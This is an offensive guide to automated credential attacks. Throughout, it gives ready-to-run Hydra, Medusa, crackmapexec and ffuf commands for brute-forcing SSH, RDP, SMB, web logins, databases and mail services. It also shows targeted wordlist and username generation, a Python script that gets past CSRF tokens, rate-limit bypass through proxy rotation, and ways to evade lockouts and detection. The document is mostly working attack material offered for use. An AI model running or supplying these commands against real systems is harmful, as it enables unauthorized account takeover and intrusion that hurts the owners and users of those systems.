# Credential Stuffing Automation Guide

> Practical reference for automated credential attacks using Hydra, Medusa, and custom tooling. Covers wordlist optimization, rate limiting bypass, and protocol-specific configurations.

## 1. Hydra Basic Usage

Hydra supports 50+ protocols. Master the common syntax patterns.

```bash
# SSH brute force with username and password lists
hydra -L users.txt -P passwords.txt ssh://10.10.10.1 -t 4

# HTTP POST form attack
hydra -l admin -P wordlist.txt 10.10.10.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# FTP with single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.1

# RDP brute force (slow, use few threads)
hydra -L users.txt -P passwords.txt rdp://10.10.10.1 -t 1 -W 5

# SMB authentication
hydra -L users.txt -P passwords.txt smb://10.10.10.1

# MySQL with verbose output
hydra -l root -P passwords.txt mysql://10.10.10.1 -V
```

## 2. Medusa for Parallel Attacks

Medusa excels at parallel host and user combinations.

```bash
# Basic Medusa syntax
medusa -h 10.10.10.1 -U users.txt -P passwords.txt -M ssh

# Attack multiple hosts simultaneously
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -T 5

# HTTP basic auth
medusa -h 10.10.10.1 -U users.txt -P passwords.txt -M http -m DIR:/admin

# Specify port and timeout
medusa -h 10.10.10.1 -u admin -P passwords.txt -M ssh -n 2222 -t 10

# Resume interrupted session
medusa -h 10.10.10.1 -U users.txt -P passwords.txt -M ftp -Z resume_file.txt

# Combo file format (host:user:password per line)
medusa -C combo.txt -M ssh
```

## 3. Custom Wordlist Generation

Targeted wordlists dramatically improve success rates.

```bash
# CeWL — scrape target website for words
cewl https://target.com -d 3 -m 6 --with-numbers -w target_cewl.txt

# CUPP — profile-based generation
cupp -i
# Enter: name, birthdate, partner, pet, company, keywords

# Crunch — pattern-based generation
# 8 char passwords: uppercase + 4 lowercase + 3 digits
crunch 8 8 -t ,@@@@%%% -o pattern_list.txt

# Mentalist-style rule application with hashcat
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule base_words.txt > mutated.txt

# Username generation from names
# first.last, flast, firstl patterns
cat names.txt | while read first last; do
  echo "${first,,}.${last,,}"
  echo "${first:0:1}${last,,}"
  echo "${first,,}${last:0:1}"
done > usernames.txt

# Combine company-specific terms
echo -e "Company2024\nCompany2025\nWelcome1\nPassword1\nSummer2025" > spray_list.txt
```

## 4. Rate Limiting Bypass Techniques

```bash
# Hydra — control timing between attempts
hydra -l admin -P wordlist.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Failed" -t 1 -W 10 -c 30
# -t 1 = single thread, -W 10 = 10s wait on connect, -c 30 = 30s between attempts

# Rotate source IPs with proxychains
proxychains hydra -l admin -P wordlist.txt ssh://10.10.10.1 -t 1

# Use SOCKS proxy list rotation
# Configure /etc/proxychains4.conf with:
# random_chain
# proxy_dns
# [ProxyList]
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051
# socks5 127.0.0.1 9052

# IP rotation with multiple interfaces
hydra -l admin -P wordlist.txt ssh://10.10.10.1 -s 22 -S -e nsr

# Distribute across time with custom script
for pass in $(cat wordlist.txt); do
  hydra -l admin -p "$pass" ssh://10.10.10.1 -t 1 2>/dev/null
  sleep $((RANDOM % 30 + 15))  # Random 15-45 second delay
done
```

## 5. HTTP Authentication Attacks

```bash
# Identify form parameters (inspect login page)
curl -s https://target.com/login | grep -i "name=" | grep -i "input"

# Hydra HTTP POST with cookie/session handling
hydra -l admin -P wordlist.txt target.com https-post-form \
  "/api/login:username=^USER^&password=^PASS^:H=Content-Type\: application/json:F=unauthorized"

# Handle CSRF tokens with custom script
python3 - <<'EOF'
import requests
import sys

session = requests.Session()
with open('passwords.txt') as f:
    for password in f:
        password = password.strip()
        # Get fresh CSRF token
        resp = session.get('https://target.com/login')
        token = resp.text.split('csrf_token" value="')[1].split('"')[0]
        # Attempt login
        data = {'username': 'admin', 'password': password, 'csrf_token': token}
        resp = session.post('https://target.com/login', data=data)
        if 'Invalid' not in resp.text:
            print(f'[+] Found: admin:{password}')
            sys.exit(0)
EOF

# Burp-style intruder with ffuf
ffuf -u https://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -w wordlist.txt -fc 401 -t 5 -p 1
```

## 6. Protocol-Specific Configurations

```bash
# LDAP bind credential testing
hydra -L users.txt -P passwords.txt ldap3://10.10.10.1 -V

# SNMP community string brute force
hydra -P community_strings.txt 10.10.10.1 snmp

# VNC password attack
hydra -P passwords.txt vnc://10.10.10.1 -t 1

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://10.10.10.1

# IMAP email
hydra -L emails.txt -P passwords.txt imap://mail.target.com -t 3

# WinRM (Windows Remote Management)
crackmapexec winrm 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```

## 7. Credential Validation and Logging

```bash
# Validate found credentials across services
crackmapexec smb 10.10.10.0/24 -u found_user -p found_pass

# Log all attempts with timestamps
hydra -l admin -P wordlist.txt ssh://10.10.10.1 -o hydra_results.txt -V 2>&1 | \
  while read line; do echo "$(date '+%Y-%m-%d %H:%M:%S') $line"; done | \
  tee timestamped_log.txt

# Parse Hydra output for successful logins
grep "\[.*\].*host:" hydra_results.txt

# Spray validated creds across network
crackmapexec smb targets.txt -u valid_user -p valid_pass --shares
```

## 8. Defensive Evasion Considerations

```bash
# Check account lockout policy before attacking (AD)
crackmapexec smb 10.10.10.1 -u guest -p '' --pass-pol

# Calculate safe attempt rate
# If lockout threshold = 5, observation window = 30 min:
# Safe: 3 attempts per user per 30 minutes

# Jitter timing to avoid pattern detection
hydra -l admin -P short_list.txt ssh://10.10.10.1 -t 1 -W 3 -c $((RANDOM % 20 + 10))

# User-agent rotation for web attacks
ffuf -u https://target.com/login -X POST \
  -d "user=admin&pass=FUZZ" -w wordlist.txt \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -t 2 -p 2-5
```
